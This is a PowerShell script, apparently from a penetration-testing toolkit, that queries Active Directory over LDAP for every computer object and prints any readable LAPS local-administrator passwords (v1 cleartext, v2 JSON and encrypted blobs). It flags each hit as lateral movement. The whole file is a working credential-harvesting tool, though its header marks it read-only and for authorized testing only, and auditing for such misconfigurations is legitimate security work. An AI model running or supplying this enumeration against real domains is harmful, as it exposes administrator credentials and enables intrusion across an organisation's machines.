<#
.SYNOPSIS
    Read ms-Mcs-AdmPwd (LAPS v1) and msLAPS-Password (LAPS v2) via LDAP from
    the current host's domain. Requires that the current user has read access
    to the attribute on at least one computer object — uncommon but devastating.

.DESCRIPTION
    LAPS stores the local Administrator password on the computer's AD object.
    A common misconfiguration: a help-desk group is granted "All extended
    rights" on an OU, which transitively includes ms-Mcs-AdmPwd.

    This script queries the domain for every computer object the current user
    can read ms-Mcs-AdmPwd / msLAPS-Password on. If even ONE non-blank
    password comes back, that's lateral movement to local admin on that host.

.NOTES
    Read-only. No spray, no writes. Authorized testing only.
    Per ADR-004 D4: this enumerates with the current user's reach — no
    auto-escalation, no admin runas.
#>
[CmdletBinding()]
param(
    [string]$DomainController,
    [string]$SearchBase
)

function Hit($t)  { Write-Host "[+] $t" -ForegroundColor Green }
function Miss($t) { Write-Host "[-] $t" -ForegroundColor DarkGray }
function Warn($t) { Write-Host "[!] $t" -ForegroundColor Yellow }
function Hdr($t)  { Write-Host ""; Write-Host ("="*70) -ForegroundColor Cyan
                    Write-Host "  $t" -ForegroundColor Cyan
                    Write-Host ("="*70) -ForegroundColor Cyan }

Hdr "LAPS PASSWORD ENUMERATION"

# Resolve the domain context
try {
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    if (-not $SearchBase) {
        $SearchBase = "LDAP://" + ($domain.GetDirectoryEntry().distinguishedName)
    }
    if (-not $DomainController) {
        $DomainController = $domain.PdcRoleOwner.Name
    }
} catch {
    Write-Host "[!] Cannot resolve current domain context: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

"Domain controller: $DomainController"
"Search base:       $SearchBase"
""

$root = [ADSI]$SearchBase
$searcher = New-Object System.DirectoryServices.DirectorySearcher($root)
$searcher.Filter = "(objectClass=computer)"
$searcher.PageSize = 500
$null = $searcher.PropertiesToLoad.Add("dNSHostName")
$null = $searcher.PropertiesToLoad.Add("ms-Mcs-AdmPwd")           # LAPS v1
$null = $searcher.PropertiesToLoad.Add("ms-Mcs-AdmPwdExpirationTime")
$null = $searcher.PropertiesToLoad.Add("msLAPS-Password")         # LAPS v2 (JSON-blob)
$null = $searcher.PropertiesToLoad.Add("msLAPS-EncryptedPassword")

$total    = 0
$readable = 0
$encrypted = 0

try {
    foreach ($r in $searcher.FindAll()) {
        $total++
        $host = $r.Properties["dnshostname"]
        $pwd  = $r.Properties["ms-mcs-admpwd"]
        $v2   = $r.Properties["mslaps-password"]
        $enc  = $r.Properties["mslaps-encryptedpassword"]
        if ($pwd.Count -gt 0 -and $pwd[0]) {
            Hit "READABLE (LAPSv1) $host -> $($pwd[0])"
            $readable++
        }
        if ($v2.Count -gt 0 -and $v2[0]) {
            Hit "READABLE (LAPSv2 JSON) $host -> $($v2[0])"
            $readable++
        }
        if ($enc.Count -gt 0 -and $enc[0]) {
            # Encrypted blob present — operator needs the LAPS DPAPI cred to decrypt
            Warn "ENCRYPTED (LAPSv2) $host — see msLAPS-EncryptedPassword (operator decrypts)"
            $encrypted++
        }
    }
} catch {
    Write-Host "[!] Search failed: $($_.Exception.Message)" -ForegroundColor Red
}

""
"Computers enumerated: $total"
"Readable cleartext:   $readable"
"Readable encrypted:   $encrypted"
if ($readable -gt 0) {
    Hit "CRITICAL: at least one LAPS password readable as the current user — lateral movement available"
} elseif ($encrypted -gt 0) {
    Warn "HIGH: encrypted LAPS blobs readable — DPAPI extraction required"
} else {
    Miss "No LAPS-readable computer accounts visible to this user."
}
